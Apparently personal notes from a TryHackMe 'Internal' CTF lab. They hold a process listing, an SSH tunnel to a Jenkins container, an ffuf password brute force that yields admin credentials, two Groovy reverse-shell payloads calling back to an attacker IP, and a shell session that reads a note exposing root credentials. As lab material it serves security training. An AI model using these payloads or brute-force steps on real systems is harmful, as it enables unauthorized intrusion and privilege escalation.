root        25  0.0  0.0      0     0 ?        SN   08:37   0:00 [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   08:37   0:00 [crypto]
root        27  0.0  0.0      0     0 ?        I<   08:37   0:00 [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   08:37   0:00 [kblockd]
root        29  0.0  0.0      0     0 ?        I<   08:37   0:00 [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   08:37   0:00 [md]
root        31  0.0  0.0      0     0 ?        I<   08:37   0:00 [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   08:37   0:00 [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   08:37   0:00 [watchdogd]
root        36  0.0  0.0      0     0 ?        S    08:37   0:00 [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    08:37   0:00 [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   08:37   0:00 [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   08:37   0:00 [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    08:37   0:00 [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   08:37   0:00 [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    08:37   0:00 [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   08:37   0:00 [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   08:37   0:00 [ipv6_addrconf]
root       101  0.0  0.0      0     0 ?        I<   08:37   0:00 [kstrp]
root       118  0.0  0.0      0     0 ?        I<   08:37   0:00 [charger_manager]
root       189  0.0  0.0      0     0 ?        I<   08:37   0:00 [ttm_swap]
root       214  0.0  0.0      0     0 ?        I<   08:37   0:00 [kdmflush]
root       215  0.0  0.0      0     0 ?        I<   08:37   0:00 [bioset]
root       284  0.0  0.0      0     0 ?        I<   08:37   0:00 [raid5wq]
root       337  0.0  0.0      0     0 ?        S    08:37   0:00 [jbd2/dm-0-8]
root       338  0.0  0.0      0     0 ?        I<   08:37   0:00 [ext4-rsv-conver]
root       405  0.0  0.7 127648 15968 ?        S<s  08:37   0:00 /lib/systemd/systemd-journald
root       415  0.0  0.0      0     0 ?        I<   08:37   0:00 [iscsi_eh]
root       425  0.0  0.0 105904  1828 ?        Ss   08:37   0:00 /sbin/lvmetad -f
root       427  0.0  0.2  45832  4424 ?        Ss   08:37   0:00 /lib/systemd/systemd-udevd
root       428  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib-comp-wq]
root       429  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib-comp-unb-wq]
root       430  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib_mcast]
root       431  0.0  0.0      0     0 ?        I<   08:37   0:00 [ib_nl_sa_wq]
root       432  0.0  0.0      0     0 ?        I<   08:37   0:00 [rdma_cm]
root       438  0.0  0.0      0     0 ?        I<   08:37   0:00 [kworker/0:1H]
root       451  0.0  0.0      0     0 ?        S<   08:37   0:00 [loop0]
root       452  0.0  0.0      0     0 ?        S<   08:37   0:00 [loop1]
root       582  0.0  0.0      0     0 ?        S    08:37   0:00 [jbd2/xvda2-8]
root       583  0.0  0.0      0     0 ?        I<   08:37   0:00 [ext4-rsv-conver]
systemd+   608  0.0  0.1 141956  3084 ?        Ssl  08:37   0:00 /lib/systemd/systemd-timesyncd
systemd+   738  0.0  0.2  80080  5232 ?        Ss   08:37   0:00 /lib/systemd/systemd-networkd
systemd+   757  0.0  0.2  70772  6028 ?        Ss   08:37   0:00 /lib/systemd/systemd-resolved
root       823  0.0  0.1  30104  2808 ?        Ss   08:37   0:00 /usr/sbin/cron -f
root       828  0.0  0.2  70616  5788 ?        Ss   08:37   0:00 /lib/systemd/systemd-logind
syslog     829  0.0  0.1 263036  4020 ?        Ssl  08:37   0:00 /usr/sbin/rsyslogd -n
message+   831  0.0  0.2  50060  4376 ?        Rs   08:37   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfi
root       843  0.0  0.1 621620  2180 ?        Ssl  08:37   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       848  0.0  0.3 286452  6500 ?        Ssl  08:37   0:00 /usr/lib/accountsservice/accounts-daemon
daemon     849  0.0  0.1  28332  2108 ?        Ss   08:37   0:00 /usr/sbin/atd -f
root       850  0.0  0.8 169188 16812 ?        Ssl  08:37   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-trigger
root       856  0.0  1.4 639036 28556 ?        Ssl  08:37   0:01 /usr/lib/snapd/snapd
root       858  0.0  2.0 672560 41608 ?        Ssl  08:37   0:05 /usr/bin/containerd
root       869  0.0  0.2  72300  6076 ?        Ss   08:37   0:00 /usr/sbin/sshd -D
root       870  0.0  0.9 186028 19788 ?        Ssl  08:37   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-
root       877  0.0  4.1 839316 84072 ?        Ssl  08:37   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.s
root       879  0.0  0.0  14768  2028 ttyS0    Ss+  08:37   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       880  0.0  0.0  13244  1724 tty1     Ss+  08:37   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       923  0.0  0.3 291452  6988 ?        Ssl  08:37   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1045  0.0  1.2 489804 24548 ?        Ss   08:37   0:00 /usr/sbin/apache2 -k start
mysql     1047  0.0 11.1 1165472 227444 ?      Sl   08:37   0:08 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1390  0.0  0.1 404800  3496 ?        Sl   08:37   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080
root      1415  0.0  0.2   9364  5704 ?        Sl   08:37   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.con
aubrean+  1443  0.0  0.0   1148     4 ?        Ss   08:37   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1483  0.6 12.5 2587808 255104 ?      Sl   08:37   1:29 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAge
aubrean+  1535  0.0  0.0      0     0 ?        Z    08:37   0:00 [jenkins.sh] <defunct>
www-data  2599  0.0  2.0 570044 41672 ?        S    09:10   0:02 /usr/sbin/apache2 -k start
www-data  2621  0.0  2.1 570460 42900 ?        S    09:10   0:02 /usr/sbin/apache2 -k start
www-data  2628 12.4  2.2 574136 46220 ?        S    09:10  22:54 /usr/sbin/apache2 -k start
www-data  2653  0.0  2.0 569980 41412 ?        S    09:24   0:02 /usr/sbin/apache2 -k start
www-data  2861  0.0  1.8 569788 38472 ?        S    10:19   0:02 /usr/sbin/apache2 -k start
www-data  2875  0.0  2.0 570324 41908 ?        S    10:20   0:02 /usr/sbin/apache2 -k start
www-data  2880  0.0  1.9 571876 39032 ?        S    10:20   0:02 /usr/sbin/apache2 -k start
www-data  2980  0.0  2.1 572840 44728 ?        S    10:50   0:02 /usr/sbin/apache2 -k start
www-data  3070  0.0  1.8 571620 38440 ?        S    11:15   0:02 /usr/sbin/apache2 -k start
www-data  3071 39.3  2.0 571936 42344 ?        R    11:15  23:17 /usr/sbin/apache2 -k start
root      3091  0.0  0.0      0     0 ?        I    11:26   0:00 [kworker/u30:1]
www-data  3095  0.0  0.0   4628   860 ?        S    11:28   0:00 sh -c sh
www-data  3096  0.0  0.0   4628  1648 ?        S    11:28   0:00 sh
www-data  3216  0.0  0.3  33116  7004 ?        S    11:46   0:00 python -c import pty; pty.spawn("/bin/bash")
www-data  3217  0.0  0.0  18508  1872 pts/0    Ss+  11:46   0:00 /bin/bash
www-data  3221  0.0  0.0   4628   908 ?        S    11:51   0:00 sh -c sh
www-data  3222  0.0  0.0   4628   764 ?        S    11:51   0:00 sh
www-data  3223  0.0  0.3  33244  6836 ?        S    11:51   0:00 python -c import pty; pty.spawn('/bin/bash')
www-data  3224  0.0  0.0  18508  1996 pts/1    Ss+  11:51   0:00 /bin/bash
root      3276  0.0  0.0      0     0 ?        I    12:04   0:00 [kworker/0:0]
root      3300  0.0  0.0      0     0 ?        R    12:07   0:00 [kworker/u30:0]
root      3305  0.0  0.3 105688  6920 ?        Ss   12:08   0:00 sshd: aubreanna [priv]
aubrean+  3309  0.0  0.3  76692  7792 ?        Ss   12:08   0:00 /lib/systemd/systemd --user
aubrean+  3310  0.0  0.1 193680  2424 ?        S    12:08   0:00 (sd-pam)
aubrean+  3450  0.0  0.2 107984  5160 ?        S    12:08   0:00 sshd: aubreanna@pts/2
aubrean+  3451  0.0  0.2  21568  4792 pts/2    Ss   12:08   0:00 -bash
root      3570  0.0  0.0      0     0 ?        I    12:13   0:00 [kworker/0:2]
aubrean+  3614  0.0  0.1  38448  3416 pts/2    R+   12:14   0:00 ps -aux

```

**Auto Enum**
#linpeas
```bash
aubreanna@internal:~$ ./linpeas.sh >> peas_output.txt
```
#ssh_tunnel
```bash
#Attack Box
ssh -L 9005:172.17.0.2:8080 aubreanna@internal.thm
```
go to localhost:9005 for the jenkins admin page

Capture a login request for brute forcing
#burp
![[jenkins_request]]

Brute force
#ffuf 
```bash
ffuf -request Artifacts/jenkins_request -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt


└─$ ffuf -request Artifacts/jenkins_request -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:9005/j_acegi_security_check
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Referer: http://localhost:9005/loginError
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Origin: http://localhost:9005
 :: Header           : Cookie: JSESSIONID.604fda8f=node0zhr72fr6ho731nmt65nvptrh10.node0
 :: Header           : Connection: keep-alive
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Host: localhost:9005
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : j_username=admin&j_password=FUZZ&from=%2F&Submit=Sign+in
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500

admin:spongebob
```

Jenkins console (Script Console)
#groovy #priv_esc #jenkins
```groovy
r = Runtime.getRuntime()

p= r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.93.71/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```groovy
String host="10.11.93.71";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Enum jenkins
```
┌──(sstephens㉿kali-ppt)-[~/…/Personal_Pentest_Notes/Challenges & CTFs/TryHackme/Internal]
└─$ nc -lvnp 4444                                                                                                                                 
listening on [any] 4444 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.227.173] 52274
whoami
jenkins
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123

```